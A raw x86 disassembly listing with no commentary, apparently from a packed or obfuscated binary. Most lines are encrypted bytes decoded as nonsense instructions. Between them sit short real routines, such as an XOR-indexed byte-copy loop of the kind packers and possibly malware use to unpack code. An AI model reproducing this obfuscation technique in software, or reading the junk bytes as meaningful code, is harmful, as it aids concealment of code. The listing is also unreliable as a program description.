  407afa:	repnz out dx,al
  407afc:	loopne 0x407b65
  407afe:	ror    DWORD PTR [ecx-0x28d2d473],0x58
  407b05:	aas    
  407b06:	pop    eax
  407b07:	or     esi,DWORD PTR [edi-0x41]
  407b0a:	addr16 dec edi
  407b0c:	and    ecx,DWORD PTR [eax-0x65f85ea9]
  407b12:	xor    dl,BYTE PTR [esi]
  407b14:	adc    DWORD PTR [ebp+0x21daadd8],0xedf08735
  407b1e:	pushf  
  407b1f:	iret   
  407b20:	pop    ss
  407b21:	mov    al,0x5
  407b23:	or     eax,0xcc233692
  407b28:	(bad)  
  407b29:	and    ch,bh
  407b2b:	mov    dh,0x53
  407b2d:	jns    0x407b8b
  407b2f:	inc    esi
  407b30:	sub    al,0x2f
  407b32:	xor    DWORD PTR [eax+0xdde930c],ecx
  407b38:	jmp    0x1b8db0cb
  407b3d:	in     al,dx
  407b3e:	jmp    0xa1f4eea1
  407b43:	(bad)  
  407b44:	sub    DWORD PTR [edi],ebp
  407b46:	mov    ah,0x46
  407b48:	xchg   edx,eax
  407b49:	std    
  407b4a:	jmp    0x407ba3
  407b4c:	add    bh,BYTE PTR [esi]
  407b4e:	or     BYTE PTR [esi],al
  407b50:	arpl   WORD PTR [esi],si
  407b52:	daa    
  407b53:	mov    cl,0x4d
  407b55:	xor    esp,DWORD PTR [ebp+0x9]
  407b58:	xchg   ebx,eax
  407b59:	idiv   DWORD PTR [edx]
  407b5b:	mov    bh,0x89
  407b5d:	lea    edi,[eax+0x4ee79cac]
  407b63:	data16 jmp 0x407bbe
  407b66:	loope  0x407bdf
  407b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b69:	hlt    
  407b6a:	push   ss
  407b6b:	mov    eax,0xbe6f88ac
  407b70:	(bad)  
  407b72:	rcl    BYTE PTR [ebp+0x3b],cl
  407b75:	cdq    
  407b76:	daa    
  407b77:	int    0x96
  407b79:	rol    ecx,cl
  407b7b:	pop    esp
  407b7c:	inc    eax
  407b7d:	mov    bh,0xb7
  407b7f:	sbb    DWORD PTR [edi+0xc],ecx
  407b82:	pop    edx
  407b83:	fsubr  DWORD PTR [ecx+0x35]
  407b86:	rcr    BYTE PTR [ebx-0x32],cl
  407b89:	inc    edx
  407b8a:	call   0xdcdd:0x998cb789
  407b91:	sahf   
  407b92:	jae    0x407bb9
  407b94:	xchg   esi,eax
  407b95:	(bad)  
  407b96:	add    DWORD PTR [edx],edi
  407b98:	adc    esp,DWORD PTR [eax+ebx*8+0x58240eb9]
  407b9f:	mov    eax,0x33107d03
  407ba4:	rol    DWORD PTR [ebx],1
  407ba6:	(bad)  
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x50b7:0x7dfdba79
  407cce:	loope  0x407cb9
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407d17
  407cd8:	sti    
  407cd9:	dec    edi
  407cda:	jbe    0x407d31
  407cdc:	stos   DWORD PTR es:[edi],eax
  407cdd:	add    BYTE PTR [ebx-0x401f5969],dl
  407ce3:	stos   BYTE PTR es:[edi],al
  407ce4:	into   
  407ce5:	sub    DWORD PTR [edi+0x5c652167],ecx
  407ceb:	das    
  407cec:	into   
  407ced:	mov    fs,esp
  407cef:	mov    esp,0x132e97bd
  407cf4:	test   DWORD PTR [edx],eax
  407cf6:	push   ebx
  407cf7:	mov    bl,0xdc
  407cf9:	jns    0x407cfd
  407cfb:	out    dx,eax
  407cfc:	icebp  
  407cfd:	and    DWORD PTR [edx+0x781b567],ebp
  407d03:	inc    cl
  407d05:	xchg   ecx,eax
  407d06:	(bad)  
  407d08:	(bad)  
  407d09:	jg     0x407ccc
  407d0b:	pop    ds
  407d0c:	call   0xd862:0x3dd9b7a8
  407d13:	ja     0x407ca7
  407d15:	add    al,0x26
  407d17:	pop    ecx
  407d18:	mov    edx,es
  407d1a:	push   cs
  407d1b:	fsubr  st(4),st
  407d1d:	es mov dh,0xd4
  407d20:	pop    esp
  407d21:	mov    dl,0x9e
  407d23:	adc    dh,dh
  407d25:	push   edi
  407d26:	shr    DWORD PTR [esi+edi*4-0x12],cl
  407d2a:	adc    DWORD PTR [ebp-0x725a150],eax
  407d30:	pop    eax
  407d31:	xchg   esp,eax
  407d32:	jb     0x407cc2
  407d34:	mov    dl,BYTE PTR [edi]
  407d36:	xchg   BYTE PTR ds:0xfbdecf43,cl
  407d3c:	mov    al,0xae
  407d3e:	shl    BYTE PTR [eax],1
  407d40:	adc    DWORD PTR [ecx-0x9],ecx
  407d43:	jne    0x407d16
  407d45:	cmp    DWORD PTR [eax],eax
  407d47:	popf   
  407d48:	ret    
  407d49:	jp     0x407db5
  407d4b:	dec    esp
  407d4c:	mov    ds:0x643b340c,al
  407d51:	lods   al,BYTE PTR ds:[esi]
  407d52:	outs   dx,BYTE PTR ds:[esi]
  407d53:	dec    eax
  407d54:	fist   WORD PTR [esi+0x66]
  407d57:	in     al,dx
  407d58:	das    
  407d59:	sti    
  407d5a:	sbb    ah,ch
  407d5c:	(bad)  
  407d5e:	dec    ebx
  407d5f:	loop   0x407dc2
  407d61:	xchg   edx,eax
  407d62:	mov    bl,0x9c
  407d64:	mov    ch,0x37
  407d66:	sub    al,0x0
  407d68:	aam    0x94
  407d6a:	mov    ebx,0xdb198ad4
  407d6f:	add    bh,cl
  407d71:	mov    cs,WORD PTR ds:0x5d63cbd8
  407d77:	test   al,0x84
  407d79:	dec    edx
  407d7a:	cmp    esp,DWORD PTR ds:0x43ab0380
  407d80:	loop   0x407ddd
  407d82:	mov    al,BYTE PTR [esi+0x38286314]
  407d88:	inc    eax
  407d89:	jb     0x407d3f
  407d8b:	js     0x407dcc
  407d8d:	inc    ecx
  407d8e:	or     esp,DWORD PTR [eax]
  407d90:	arpl   WORD PTR [ebx+0x34f6385e],si
  407d96:	fadd   QWORD PTR [edx-0x4]
  407d99:	jge    0x407ddc
  407d9b:	jl     0x407ded
  407d9d:	scas   al,BYTE PTR es:[edi]
  407d9e:	mov    cl,0xa2
  407da0:	dec    esp
  407da1:	mov    ecx,DWORD PTR [edi]
  407da3:	jg     0x407d92
  407da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da6:	push   ds
  407da7:	sti    
  407da8:	lds    esp,FWORD PTR [edi+0x60]
  407dab:	jmp    0x3c8f:0x7a955de7
  407db2:	out    0xa6,al
  407db4:	shl    BYTE PTR [ebx+eiz*2],0x3b
  407db8:	pop    esi
  407db9:	add    eax,0x9783f2b5
  407dbe:	mov    BYTE PTR [edi-0x7d9631dd],cl
  407dc4:	jle    0x407d72
  407dc6:	inc    eax
  407dc7:	pop    esi
  407dc8:	int3   
  407dc9:	adc    BYTE PTR [edx+0x9],ch
  407dcc:	arpl   WORD PTR [esi+0x2b08e32d],cx
  407dd2:	add    al,0xdd
  407dd4:	mov    ecx,edi
  407dd6:	(bad)  
  407dd8:	sbb    BYTE PTR [ebx],dh
  407dda:	add    bh,dl
  407ddc:	xchg   esp,eax
  407ddd:	add    eax,0x6cad375f
  407de2:	jecxz  0x407e5a
  407de4:	inc    esi
  407de5:	mov    DWORD PTR [edi-0x2a522d29],edi
  407deb:	add    bl,BYTE PTR [ecx]
  407ded:	sub    ebx,edi
  407def:	sub    dl,BYTE PTR [ecx]
  407df1:	cmp    esp,DWORD PTR [esi]
  407df3:	xchg   ebx,eax
  407df4:	jle    0x407e44
  407df6:	lods   eax,DWORD PTR ds:[esi]
  407df7:	cmp    ch,bl
  407df9:	lahf   
  407dfa:	ficom  WORD PTR [edx+ecx*4]
  407dfd:	push   esi
  407dfe:	sahf   
  407dff:	daa    
  407e00:	dec    ebp
  407e01:	repnz pop ebp
  407e03:	cmp    BYTE PTR [ebx+0xd0731a2],bl
  407e09:	pop    edx
  407e0a:	fmul   QWORD PTR [esi-0x21e2af1a]
  407e10:	mov    bl,0xf2
  407e12:	inc    esi
  407e13:	add    bl,BYTE PTR [ebp+0x843364d]
  407e19:	pop    ebx
  407e1a:	pop    ss
  407e1b:	adc    al,0x2f
  407e1d:	(bad)  
  407e1e:	pop    ecx
  407e1f:	popf   
  407e20:	(bad)  
  407e21:	rol    DWORD PTR [esi+0x31b22ac3],cl
  407e27:	dec    eax
  407e28:	adc    bl,dl
  407e2a:	arpl   WORD PTR [edi+0x37c219e4],cx
  407e30:	fwait
  407e31:	sub    DWORD PTR [ebp+0x54],esp
  407e34:	pop    ebp
  407e35:	or     ah,ah
  407e37:	shl    DWORD PTR [ecx+0x5c7c63b],0xe2
  407e3e:	stos   DWORD PTR es:[edi],eax
  407e3f:	inc    ecx
  407e40:	add    ch,dl
  407e42:	inc    ebp
  407e43:	add    BYTE PTR [eax],al
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    esp,ecx
  407e84:	(bad)  
  407e86:	cmp    BYTE PTR [edi+0x10],cl
  407e89:	jle    0x407f09
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407ed1
  407e90:	out    0x51,eax
  407e92:	test   eax,0xf1f5a047
  407e97:	xor    al,BYTE PTR [ebp-0x10]
  407e9a:	add    BYTE PTR [ecx-0x15f39e52],dl
  407ea0:	sar    BYTE PTR [ebx+0x31f9b056],1
  407ea6:	call   0x1dc1:0x2811e56c
  407ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eae:	loop   0x407e4e
  407eb0:	sbb    ebp,edx
  407eb2:	pop    eax
  407eb3:	jo     0x407ef1
  407eb5:	sbb    eax,0xbbdbf7ed
  407eba:	(bad)  
  407ebb:	fwait
  407ebc:	pop    edx
  407ebd:	dec    edi
  407ebe:	sbb    eax,eax
  407ec0:	push   esp
  407ec1:	mov    BYTE PTR [ebp-0x54deab03],bh
  407ec7:	dec    esi
  407ec8:	xchg   esp,eax
  407ec9:	mov    esp,0xabcd0f80
  407ece:	ret    0x1aaf
  407ed1:	out    dx,eax
  407ed2:	push   ecx
  407ed3:	int3   
  407ed4:	adc    al,0x53
  407ed6:	xor    eax,0x2ff7ce67
  407edb:	and    bl,BYTE PTR [esi+0x194b8018]
  407ee1:	leave  
  407ee2:	mov    dl,0x3c
  407ee4:	out    0xdc,eax
  407ee6:	jecxz  0x407e91
  407ee8:	shl    BYTE PTR [ebp+edx*1-0x7cbd0a41],1
  407eef:	jmp    0x9918:0x741b8f43
  407ef6:	xchg   ebx,eax
  407ef7:	les    ebp,FWORD PTR [esi]
  407ef9:	push   esp
  407efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407efc:	sub    BYTE PTR ds:0xdf5268,ch
  407f02:	in     eax,0xd6
  407f04:	push   eax
  407f05:	stc    
  407f06:	adc    eax,0xd2de787d
  407f0b:	cmp    al,0xfe
  407f0d:	pop    ds
  407f0e:	aad    0x1a
  407f10:	mov    al,0xf6
  407f12:	adc    DWORD PTR [ebp-0x29],ebp
  407f15:	int    0xb9
  407f17:	fidiv  WORD PTR [edx+0x78deda41]
  407f1d:	mov    bh,0xbc
  407f1f:	mov    al,ds:0xa2bbc74a
  407f24:	pop    esp
  407f25:	xor    DWORD PTR [ecx],edi
  407f27:	mov    ebx,0x5feca4ce
  407f2c:	pop    edi
  407f2d:	sub    esp,DWORD PTR [ecx]
  407f2f:	inc    ebx
  407f30:	lock jecxz 0x407f80
  407f33:	add    al,0xe8
  407f35:	faddp  st(5),st
  407f37:	fst    DWORD PTR [edx+0x7dba31da]
  407f3d:	jne    0x407ec8
  407f3f:	mov    DWORD PTR [eax-0x10],0xdf52ea23
  407f46:	mov    bh,0xe1
  407f48:	int    0xdd
  407f4a:	push   ecx
  407f4b:	jle    0x407fca
  407f4d:	push   ebp
  407f4e:	sti    
  407f4f:	mov    eax,ds:0x33b4c30d
  407f54:	pop    ebp
  407f55:	xchg   edx,eax
  407f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f58:	mov    dh,0xae
  407f5a:	into   
  407f5b:	and    BYTE PTR [ecx],ch
  407f5d:	loopne 0x407f3b
  407f5f:	fisub  WORD PTR [eax]
  407f61:	push   edx
  407f62:	add    eax,0xfb51bbfc
  407f67:	into   
  407f68:	mov    ch,0x42
  407f6a:	cmp    al,0x1
  407f6c:	mov    eax,0xe4641895
  407f71:	iret   
  407f72:	inc    eax
  407f73:	cmp    eax,0x51e4dc4e
  407f78:	arpl   WORD PTR [ebx-0x7f],sp
  407f7b:	inc    esp
  407f7c:	lea    ecx,[edx]
  407f7e:	sahf   
  407f7f:	and    al,0xae
  407f81:	mov    ebx,0xebdcc9a7
  407f86:	mov    ds:0xab0f8fa3,eax
  407f8b:	sub    BYTE PTR [ebx],dh
  407f8d:	inc    ecx
  407f8e:	hlt    
  407f8f:	mov    dl,0x7d
  407f91:	nop
  407f92:	sub    al,0xf5
  407f94:	out    0xf4,al
  407f96:	push   esi
  407f97:	jne    0x407ff4
  407f99:	mov    edx,0x7b56e722
  407f9e:	mov    edx,0xdd5f0815
  407fa3:	mov    dh,0x11
  407fa5:	inc    ebp
  407fa6:	mov    esp,0xc3acc74b
  407fab:	sahf   
  407fac:	xchg   edi,eax
  407fad:	fucom  st(6)
  407faf:	in     al,dx
  407fb0:	xor    eax,0xb5acdab9
  407fb5:	cli    
  407fb6:	mov    ds:0xdc9e4117,al
  407fbb:	cld    
  407fbc:	sbb    al,BYTE PTR [edi]
  407fbe:	jmp    FWORD PTR [ebx-0x4a1d2323]
  407fc4:	popf   
  407fc5:	and    cl,BYTE PTR [ecx+eax*4-0x5915d181]
  407fcc:	mov    ds,WORD PTR [ebp+0x52]
  407fcf:	mov    eax,0x97718e2a
  407fd4:	and    ebp,ebp
  407fd6:	adc    ch,bh
  407fd8:	push   ax
  407fda:	xchg   edi,eax
  407fdb:	popa   
  407fdc:	and    eax,0xc04776c2
  407fe1:	aam    0xd
  407fe3:	adc    ebx,DWORD PTR [edx]
  407fe5:	mov    eax,0xc75785b1
  407fea:	cs pop ds
  407fec:	inc    ebx
  407fed:	in     al,dx
  407fee:	push   ecx
  407fef:	xor    BYTE PTR [edx+0x33],bl
  407ff2:	rol    DWORD PTR [ebx],0xc2
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	retf   0x389d
  408011:	push   ds
  408012:	sub    eax,0xdc7e7e16
  408017:	jg     0x408097
  408019:	jle    0x407fd5
  40801b:	and    BYTE PTR [ebx],dl
  40801d:	(bad)
  408020:	repnz scas eax,DWORD PTR es:[edi]
  408022:	mov    ds:0x30b21a12,eax
  408027:	pop    esp
  408028:	aaa    
  408029:	mov    bh,0xd
  40802b:	mov    DWORD PTR [ecx-0x1c],edi
  40802e:	mov    eax,ds:0xdc6649de
  408033:	mov    ch,0x72
  408035:	dec    edi
  408036:	pop    edi
  408037:	sbb    esi,0xeaa6754
  40803d:	sub    al,0xcc
  40803f:	xor    eax,DWORD PTR [edi+0x4bd49195]
  408045:	xor    dh,BYTE PTR [ecx+0x6f1017de]
  40804b:	and    DWORD PTR [ecx-0x69],0x74
  40804f:	push   cs
  408050:	dec    esi
  408051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408052:	sbb    edx,DWORD PTR [esp+ebp*2+0x22]
  408056:	outs   dx,BYTE PTR ds:[esi]
  408057:	iret   
  408058:	mov    DWORD PTR [edx-0x47ca581f],edi
  40805e:	test   eax,0xa8519fe4
  408063:	add    BYTE PTR [eax-0x167858b7],dl
  408069:	jmp    0x9093:0xcb686a2
  408070:	xor    esi,DWORD PTR [ebx+0x7b]
  408073:	cdq    
  408074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408075:	je     0x40807a
  408077:	bound  eax,QWORD PTR [ebp+0x312d4094]
  40807d:	pop    edi
  40807e:	pop    esi
  40807f:	mov    dl,0x42
  408081:	dec    ebp
  408082:	outs   dx,DWORD PTR ds:[esi]
  408083:	sub    dl,dh
  408085:	sbb    ch,ch
  408087:	pop    eax
  408088:	ins    DWORD PTR es:[edi],dx
  408089:	mov    al,0x8b
  40808b:	cli    
  40808c:	jne    0x4080cc
  40808e:	icebp  
  40808f:	loope  0x40807b
  408091:	push   ebx
  408092:	scas   al,BYTE PTR es:[edi]
  408093:	mov    edi,cs
  408095:	inc    ecx
  408096:	cwde   
  408097:	inc    edi
  408098:	lods   al,BYTE PTR ds:[esi]
  408099:	xchg   BYTE PTR [edi+0x7efcb70c],bh
  40809f:	loopne 0x40805c
  4080a1:	mov    ds:0x2622bb48,eax
  4080a6:	sahf   
  4080a7:	inc    esp
  4080a8:	jge    0x408108
  4080aa:	aad    0xe2
  4080ac:	xor    al,0x18
  4080ae:	out    0xac,eax
  4080b0:	dec    edi
  4080b1:	pop    edx
  4080b2:	add    eax,0xb5975587
  4080b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b8:	cmp    edx,DWORD PTR [ebp-0x1cd9460c]
  4080be:	das    
  4080bf:	inc    eax
  4080c0:	mov    ds:0x60e45ea2,al
  4080c5:	mov    ebx,DWORD PTR [ebx+ecx*8]
  4080c8:	mov    ds:0x92abd240,eax
  4080cd:	adc    bh,BYTE PTR [edi+eiz*8]
  4080d0:	nop
  4080d1:	pop    edx
  4080d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080d3:	and    eax,DWORD PTR [ebp-0x33f74e10]
  4080d9:	push   ds
  4080da:	fidiv  DWORD PTR [edi+0x35]
  4080dd:	(bad)  
  4080de:	mov    DWORD PTR [ecx+0x13],edi
  4080e1:	fstp   DWORD PTR ds:0x94cb1245
  4080e7:	hlt    
  4080e8:	sbb    ebp,DWORD PTR [ebx-0x7533a0e4]
  4080ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080ef:	xor    dl,BYTE PTR [edx-0x337b2766]
  4080f5:	inc    ebx
  4080f6:	push   ebx
  4080f7:	pop    esp
  4080f8:	adc    eax,0x785ddb65
  4080fd:	aad    0x50
  4080ff:	xor    al,0xf
  408102:	pop    es
  408103:	aas    
  408104:	icebp  
  408105:	aaa    
  408106:	fucomi st,st(1)
  408108:	addr16 cld 
  40810a:	jae    0x40814e
  40810c:	sahf   
  40810d:	dec    ecx
  40810e:	lahf   
  40810f:	shl    DWORD PTR [esi-0x4076eb8b],1
  408115:	out    0xa3,al
  408117:	lods   al,BYTE PTR ds:[esi]
  408118:	xchg   esp,eax
  408119:	cdq    
  40811a:	hlt    
  40811b:	dec    eax
  40811c:	mov    eax,0x9e68e557
  408121:	xchg   ebp,eax
  408122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408123:	and    eax,0xe750f6d1
  408128:	sub    esp,ecx
  40812a:	mov    WORD PTR [edi+0x4b],es
  40812d:	ds cwde 
  40812f:	or     BYTE PTR [eax-0x6f],ch
  408132:	daa    
  408133:	loope  0x4080b8
  408135:	popf   
  408136:	xor    al,0xa4
  408138:	add    BYTE PTR [esp+edi*8+0x503f6e31],dl
  40813f:	and    bh,bh
  408141:	mov    edx,0x28366278
  408146:	mov    esp,0xda45867
  40814b:	and    esp,esp
  40814d:	xor    eax,eax
  40814f:	cwde   
  408150:	sbb    esp,DWORD PTR [ecx]
  408152:	mov    ebx,0xbb09bb62
  408157:	popf   
  408158:	xor    DWORD PTR [edi-0x43d4b6d5],esi
  40815e:	pop    edi
  408160:	(bad)  
  408161:	mov    bh,0xe0
  408163:	cmc    
  408164:	test   DWORD PTR [ebx],0xe7bae5f2
  40816a:	mov    ch,0x5b
  40816c:	pushf  
  40816d:	xor    ebx,esi
  40816f:	aaa    
  408170:	sub    bh,BYTE PTR [eax]
  408172:	enter  0x1857,0x94
  408176:	dec    edx
  408177:	hlt    
  408178:	mov    DWORD PTR [eax],esi
  40817a:	data16 shl BYTE PTR [ebx],cl
  40817d:	rol    DWORD PTR [ebx],0xc2
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	test   DWORD PTR es:[edx],edi
  4081a2:	adc    al,0x52
  4081a4:	adc    DWORD PTR [edi],0x7e
  4081a7:	jle    0x408185
  4081a9:	jg     0x408229
  4081ab:	jle    0x4081b3
  4081ad:	leave  
  4081ae:	dec    edx
  4081af:	lahf   
  4081b0:	sub    al,0x7b
  4081b2:	cld    
  4081b3:	mov    bl,0x6b
  4081b5:	aas    
  4081b6:	adc    BYTE PTR [eax-0x47],dh
  4081b9:	mov    dh,0xf2
  4081bb:	lahf   
  4081bc:	xchg   DWORD PTR [ebp+0x25],ebx
  4081bf:	mov    al,0x83
  4081c1:	shr    BYTE PTR [edx+eiz*1],0x67
  4081c5:	sbb    BYTE PTR [ebx],0x44
  4081c8:	aaa    
  4081c9:	pushf  
  4081ca:	xor    al,0x63
  4081cc:	ret    
  4081cd:	loope  0x4081d5
  4081cf:	pop    ebp
  4081d0:	stos   DWORD PTR es:[edi],eax
  4081d1:	cli    
  4081d2:	mov    eax,ds:0xe5d17871
  4081d7:	sub    ebx,ebx
  4081d9:	ja     0x4081db
  4081db:	or     ah,BYTE PTR [ebx-0x19]
  4081de:	mov    ebx,0x6487a6c7
  4081e3:	adc    eax,0xef504dbf
  4081e8:	add    esp,DWORD PTR [ebx+0x6a48aa5d]
  4081ee:	mov    edi,0xd74dee31
  4081f3:	mov    ebx,0x9d2522da
  4081f8:	ret    0x20c8
  4081fb:	cmp    eax,0x79f8f93f
  408200:	loop   0x40825f
  408202:	sbb    eax,0x9e004425
  408207:	sbb    DWORD PTR [ebp-0x2314f349],esi
  40820d:	or     esi,ebp
  40820f:	cmp    eax,0x4cb6fc41
  408214:	js     0x408208
  408216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408217:	sbb    BYTE PTR [edx],al
  408219:	xchg   ebx,eax
  40821a:	sbb    BYTE PTR ds:0x20e5075,bl
  408220:	adc    cl,dh
  408222:	fstp   DWORD PTR [edi+eax*2]
  408225:	lods   al,BYTE PTR ds:[esi]
  408226:	and    al,0x11
  408228:	push   esi
  408229:	pop    edx
  40822a:	push   edx
  40822b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40822c:	pop    ds
  40822d:	fcom   QWORD PTR [ebx-0x1b]
  408230:	xchg   ecx,eax
  408231:	jmp    0xa219:0xcaa7453c
  408238:	pop    ebx
  408239:	xchg   esi,eax
  40823a:	adc    eax,0xc8133ff
  40823f:	mov    ebp,0xa7403c45
  408244:	call   0xd0705921
  408249:	jmp    0x84b1:0x6404c588
  408250:	(bad)  
  408251:	adc    BYTE PTR ds:0x156ebf9b,ah
  408257:	pop    ebp
  408258:	inc    eax
  408259:	jne    0x408262
  40825b:	mov    ch,0xc7
  40825d:	xor    BYTE PTR [edx],bh
  40825f:	push   ds
  408260:	das    
  408261:	retf   0x44b4
  408264:	cmp    eax,0x9ddc9820
  408269:	jmp    0x9656:0x264d4db3
  408270:	sub    ecx,DWORD PTR [ebx-0x3a]
  408273:	test   BYTE PTR [ecx],bl
  408275:	lods   al,BYTE PTR ds:[esi]
  408276:	out    dx,eax
  408277:	shr    BYTE PTR [ecx+eax*2-0x68],0xb2
  40827c:	or     ebp,DWORD PTR [edi+edx*8+0x73]
  408280:	push   esp
  408281:	mov    DWORD PTR [ebx-0x20425172],esp
  408287:	jmp    0x40825d
  408289:	mov    eax,0xd769b3e8
  40828e:	push   ds
  40828f:	(bad)  [ebx+0x7a0d21f]
  408295:	sbb    al,0x64
  408297:	fdiv   DWORD PTR [ebp+0x5dd9acda]
  40829d:	push   ebx
  40829e:	cld    
  40829f:	xchg   edx,eax
  4082a0:	sbb    eax,0xd0241eca
  4082a5:	push   ecx
  4082a6:	call   0x7316e4ec
  4082ab:	ret    0x8b64
  4082ae:	pop    ss
  4082af:	cmp    edi,DWORD PTR [ebp-0x2ee4a21b]
  4082b5:	adc    esi,DWORD PTR [eax+0xd6d78fe]
  4082bb:	pop    edi
  4082bc:	rcr    BYTE PTR [ebp+0x74d46621],0x4a
  4082c3:	mov    BYTE PTR [ecx+esi*4+0x6706069f],al
  4082ca:	ja     0x40827e
  4082cc:	retf   0x2c55
  4082cf:	daa    
  4082d0:	mov    ah,0x12
  4082d2:	sbb    eax,0x390e8ede
  4082d7:	add    ebp,ebp
  4082d9:	popf   
  4082da:	inc    esi
  4082db:	sub    dl,BYTE PTR [edx+0x45124153]
  4082e1:	adc    BYTE PTR [esi+0x7ea9dc68],dh
  4082e7:	test   edi,eax
  4082e9:	cmp    al,0xc6
  4082eb:	call   0x2f34bc9e
  4082f0:	(bad)  
  4082f1:	cld    
  4082f2:	inc    edx
  4082f3:	inc    edi
  4082f4:	es adc al,0x97
  4082f7:	pop    ecx
  4082f8:	xchg   ebx,eax
  4082f9:	ficomp WORD PTR [edi]
  4082fb:	test   eax,0x42c9a56b
  408300:	sub    al,0xa3
  408302:	mov    ebp,0xe0213bdf
  408307:	lds    ecx,FWORD PTR [ebx]
  408309:	dec    esi
  40830a:	mov    ah,0x7c
  40830c:	dec    ebx
  40830d:	hlt    
  40830e:	mov    ds:0x40d64c,eax
  408313:	mov    eax,DWORD PTR [ebp+0x8]
  408316:	mov    eax,DWORD PTR [eax]
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4235db,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4235db
  408340:	inc    ecx
